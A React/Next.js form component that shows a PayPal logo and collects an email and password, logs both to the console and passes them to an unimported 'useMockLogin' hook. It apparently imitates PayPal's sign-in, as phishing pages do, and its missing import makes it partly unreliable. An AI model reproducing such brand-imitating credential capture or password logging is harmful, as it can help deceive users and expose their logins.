import React from 'react';
import { useForm } from 'react-hook-form';
import Image from "next/image";
import { toast } from "react-toastify";
import { API_URL } from "../config/index";
import Cookies from "js-cookie";


const Register = ({setShowForm}) => {
  
    const form=useForm()
    const{register,handleSubmit,reset}=form
    const { login,id } = useMockLogin();
    const onSubmit =async(values) => {
        const{email,password}=values
        const submitValues = {
          id,
          email,
      password,
     
        };
        console.log(submitValues)
       

    login(submitValues)
    setShowForm(true)
      reset()
    
  };
    
      
    return (
        <form onSubmit={handleSubmit(onSubmit)}>
        <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
    <div className="relative    w-[80px] h-[80px] ">
            <Image
              src="/images/paypal-logo.svg"
              alt="avatar"
              fill
              className="object-cover ml-[120px]"
            />
          </div>

 
  
     <div className="pt-5">
       <input
         className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
         placeholder="Your email"
         {...register('email')}
         type="email"
         required
       />
           <input
             className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
             placeholder="Password"
             {...register('password')}
             type="password"
             required
           />

<button
             type="submit"
             className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
           >
             Log in
           </button>
         
       
     </div>
   
 
</div>
        </form>
    );
};

export default Register;